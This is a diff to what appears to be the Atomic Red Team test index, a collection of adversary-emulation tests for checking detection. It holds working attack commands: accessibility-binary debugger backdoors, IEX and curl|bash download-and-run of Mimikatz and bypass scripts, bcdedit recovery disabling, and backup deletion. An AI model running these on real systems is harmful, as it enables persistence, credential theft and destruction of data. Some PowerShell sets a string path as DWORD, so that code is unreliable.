@@ -178,11 +178,23 @@ persistence:
           type: String
           default: osk.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - sethc
@@ -197,11 +209,23 @@ persistence:
           type: String
           default: sethc.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - utilman
@@ -216,11 +240,24 @@ persistence:
           type: String
           default: utilman.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - magnify
@@ -235,11 +272,24 @@ persistence:
           type: String
           default: magnify.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - narrator
@@ -254,11 +304,24 @@ persistence:
           type: String
           default: narrator.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
@@ -273,11 +336,24 @@ persistence:
           type: String
           default: DisplaySwitch.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - AtBroker
@@ -292,11 +368,24 @@ persistence:
           type: String
           default: atbroker.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force | Out-Null
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
+          /f
 
 '
   T1098:
@@ -10013,7 +10102,7 @@ defense-evasion:
           type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
           makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
           print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
           reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
@@ -12754,11 +12843,23 @@ privilege-escalation:
           type: String
           default: osk.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - sethc
@@ -12773,11 +12874,23 @@ privilege-escalation:
           type: String
           default: sethc.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - utilman
@@ -12792,11 +12905,24 @@ privilege-escalation:
           type: String
           default: utilman.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - magnify
@@ -12811,11 +12937,24 @@ privilege-escalation:
           type: String
           default: magnify.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - narrator
@@ -12830,11 +12969,24 @@ privilege-escalation:
           type: String
           default: narrator.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
@@ -12849,11 +13001,24 @@ privilege-escalation:
           type: String
           default: DisplaySwitch.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - AtBroker
@@ -12868,11 +13033,24 @@ privilege-escalation:
           type: String
           default: atbroker.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force | Out-Null
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
+          /f
 
 '
   '':
@@ -15609,9 +15787,9 @@ impact:
 
 '
     - name: Windows - Disable Windows Recovery Console Repair
-      description: "Disables repair by the Windows Recovery Console on boot. \nThis
-        technique is used by numerous ransomware families and APT malware such as
-        Olympic Destroyer.\n"
+      description: |
+        Disables repair by the Windows Recovery Console on boot.
+        This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
       supported_platforms:
       - windows
       executor:
@@ -15620,6 +15798,9 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+        cleanup_command: |
+          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
+          bcdedit.exe /set {default} recoveryenabled yes
     - name: Windows - Overwrite file with Sysinternals SDelete
       description: |
         Overwrites and deletes a file using Sysinternals SDelete.
@@ -15627,19 +15808,19 @@ impact:
       supported_platforms:
       - windows
       input_arguments:
-        file_to_overwrite:
-          description: Path of file to overwrite and remove
+        sdelete_path:
+          description: Path to sdelete.exe
           type: Path
-          default: C:\some\file.txt
+          default: ''
       executor:
-        name: command_prompt
-        command: 'sdelete.exe #{file_to_overwrite}
-
-'
+        name: powershell
+        command: |
+          New-Item $env:TEMP\T1485.txt
+          Set-Location #{sdelete_path}
+          .\sdelete.exe -accepteula $env:TEMP\T1485.txt
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
-
         To stop the test, break the command with CTRL/CMD+C.
       supported_platforms:
       - centos
@@ -15668,8 +15849,11 @@ impact:
       - windows
       executor:
         name: command_prompt
-        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+        elevation_required: true
+        command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
           c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+
+'
   '':
     technique:
       x_mitre_data_sources:
@@ -16632,6 +16816,30 @@ discovery:
           \;
 
 '
+    - name: List Google Chrome Bookmarks on Windows with powershell
+      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
+        that contains bookmarks.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: 'where.exe /R C:\Users\ Bookmarks
+
+'
+    - name: List Google Chrome Bookmarks on Windows with command prompt
+      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
+        that contains bookmarks.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: 'where /R C:\Users\ Bookmarks
+
+'
   '':
     technique:
       x_mitre_data_sources:
@@ -17208,7 +17416,7 @@ discovery:
         command: |
           net view \\#{computer_name}
           get-smbshare -Name #{computer_name}
-    - name: View avaliabe share drives
+    - name: View available share drives
       description: View information about all of the resources that are shared on
         the local computer
       supported_platforms:
@@ -18070,7 +18278,20 @@ discovery:
       executor:
         name: command_prompt
         elevation_required: true
-        command: fltmc.exe | findstr.exe 385201
+        command: 'fltmc.exe | findstr.exe 385201
+
+'
+    - name: Security Software Discovery - AV Discovery via WMI
+      description: 'Discovery of installed antivirus products via a WMI query.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
+          Get displayName /Format:List
   T1518:
     technique:
       x_mitre_data_sources:
@@ -18135,11 +18356,11 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          POWERSHELL.EXE "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
-          powershell.exe "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
+          Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
+          Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
   T1082:
     technique:
       x_mitre_permissions_required:
@@ -21858,7 +22079,7 @@ execution:
         mimurl:
           description: Mimikatz url
           type: url
-          default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
       executor:
         name: command_prompt
         elevation_required: true
@@ -21876,7 +22097,7 @@ execution:
         bloodurl:
           description: BloodHound URL
           type: url
-          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
+          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -21906,7 +22127,7 @@ execution:
       executor:
         name: powershell
         elevation_required: true
-        command: "$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object
+        command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object
           -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty
           $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP
           $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item
@@ -21928,7 +22149,7 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'');
+        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'');
           Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
 
 '
@@ -25626,7 +25847,7 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
           > pi.log
 
 '
@@ -25640,12 +25861,13 @@ collection:
       - macos
       executor:
         name: bash
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
 '
-    - name: Zip a Folder with PowerShell
-      description: 'use living off the land tools to encrypt and zip a file for exfiltration
+    - name: Zip a Folder with PowerShell for Staging in Temp
+      description: 'Use living off the land tools to zip a file and stage it in the
+        Windows temporary folder for later exfiltration.
 
 '
       supported_platforms:
@@ -25653,11 +25875,11 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt
-          -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
+          -DestinationPath $env:TEMP\Folder_to_zip.zip
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip
 
 '
   '':
